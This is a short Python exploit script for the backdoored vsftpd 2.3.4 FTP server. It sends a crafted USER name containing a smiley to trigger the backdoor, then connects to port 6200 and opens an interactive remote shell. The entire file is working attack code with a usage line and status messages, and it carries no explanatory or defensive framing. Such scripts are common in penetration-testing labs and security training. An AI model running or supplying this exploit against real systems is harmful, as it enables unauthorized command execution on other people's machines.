# /bin/python3

import socket
import sys
import time

if(len(sys.argv) < 3):
	print("\nUSAGE: python3 vsftpd234_exploit.py HOST PORT \n")
	exit()

else:

	YELLOW = '\033[93m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	WHITE = '\033[97m'
	RED = '\033[91m'


	host = sys.argv[1]
	defaultPort = int(sys.argv[2])
	backdoorPort = 6200

	tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	payloadUser = "USER rapt00r:)\n".encode()
	payloadPass = "PASS rapt00r\n".encode()

	destination = (host, defaultPort)

	print(BLUE + "[*] Connecting with the Target %s:%i [*] \n" %(host,defaultPort))

	try:
		tcp.connect(destination)
		data = tcp.recv(4098)

		print(YELLOW + "[-] Launching the Exploit [-] \n")

		tcp.send(payloadUser)
		tcp.send(payloadPass)

	except:
		print(RED + "[!] Host Seens Down OR Not Vulnerable [!] \n")
		exit()

	time.sleep(1)

	try:
		backdoorSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		backdoorSocket.connect((host, backdoorPort))
	
		print(GREEN + "[+] Sucessful Exploitation [+] \n\n" + WHITE)

		while (True):
			command = input("") + '\n'

			backdoorSocket.send(command.encode())
			print(backdoorSocket.recv(4098).decode())
	
	except:
		print(RED + "[!] Exploit Failed or Canceled [!] \n" + WHITE)
	
	backdoorSocket.close()
	tcp.close
	exit()
	